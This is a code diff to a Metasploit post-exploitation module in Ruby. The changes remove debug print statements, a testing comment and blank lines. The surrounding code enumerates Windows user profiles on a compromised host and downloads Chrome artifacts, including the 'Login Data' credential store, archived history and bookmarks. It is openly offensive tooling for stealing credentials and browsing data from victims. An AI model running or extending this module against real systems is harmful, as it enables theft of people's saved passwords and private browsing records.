@@ -15,8 +15,6 @@ class Metasploit3 < Msf::Post
   include Msf::Post::File
   include Msf::Post::Windows::UserProfiles
   include Msf::Post::Windows::Registry
-  
- 
 
   def initialize(info={})
     super( update_info( info,
@@ -37,7 +35,6 @@ class Metasploit3 < Msf::Post
   #Generic Ruby Stuff for my personal reference
  
   def run
- # This part will be in the module that CALLS these functions!  Only here for testing purposes!!!!
     print_status("Hello from Metasploit! It is a pleasure to serve you today.")
     print_status("Grabbing User Profiles")
     grab_user_profiles().each do |p|
@@ -47,7 +44,6 @@ class Metasploit3 < Msf::Post
        chrome_download = download_artifact("LocalAppData",p,"Chrome_History", "Google", "Login Data.","binary/db") if check_artifact(p['LocalAppData'],p['UserName'],"Chrome History","Google")
        chrome_download = download_artifact("LocalAppData",p,"Chrome_History", "Google", "Archived History","binary/db") if check_artifact(p['LocalAppData'],p['UserName'],"Chrome History","Google")
        chrome_download = download_artifact("LocalAppData",p,"Chrome_History", "Google", "Bookmarks","binary/db") if check_artifact(p['LocalAppData'],p['UserName'],"Chrome History","Google")
-    print_error("profile= #{p}\n")
     end
   end   
     
@@ -63,13 +59,12 @@ def check_artifact(path, user, artifact_name, artifact_dir)
     else
       dirs = cmd_exec("ls -m \"#{path}\"").split(", ")
     end
-    dirs.each do |dir|
-      print_error("dir= #{dir}")
+   dirs.each do |dir|
     if dir == artifact_dir
         print_good("#{artifact_name} directory found for #{user}")
         return true
-      end
     end
+   end
     print_error("#{artifact_name} directory not found for #{user}")
     return false
   end
